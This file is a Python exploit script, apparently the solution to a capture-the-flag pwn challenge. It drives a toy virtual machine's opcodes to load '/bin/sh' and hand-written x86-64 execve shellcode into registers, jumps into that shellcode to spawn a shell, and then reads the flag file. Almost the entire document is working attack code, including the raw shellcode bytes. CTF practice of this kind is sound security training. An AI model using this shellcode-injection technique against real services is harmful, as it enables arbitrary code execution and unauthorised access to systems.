import os
from ptrlib import *

BIN_NAME = "../distfiles/chall"

chall = ELF(BIN_NAME)

HOST = os.getenv("HOST", "localhost")
PORT = int(os.getenv("PORT", 9002))

stream = remote(HOST, PORT)

LOAD, MOV, INC, DBL, ADDI, ADD  = 1, 2, 3, 4, 5, 6
AC, R1, R2, R3 = 'r0', 'r1', 'r2', 'r3'

def imm(val):
    return f'#{val}'

def op(opcode, operand):
    stream.sendlineafter(b'opcode: ', opcode)
    stream.sendlineafter(b'operand: ', operand)

def load_to_upper(reg, val):
    op(LOAD, imm(val))
    op(MOV,  reg)
    for _ in range(32): op(DBL, reg)

load_to_upper(R1, u32(b'\xeb\xee'))

load_to_upper(R2, u32(b'/sh\x00'))
load_to_upper(R3, u32(b'/bin'))

shellcode = b'\x48\x31\xf6\x6a\x3b\x58\x0f\x05'

load_to_upper(AC, u32(shellcode[4:8]))
op(LOAD, imm(u32(shellcode[0:4])))

op(ADD, R2)

stream.sendline("cat /flag-*")
print(stream.recvuntil("}").decode())
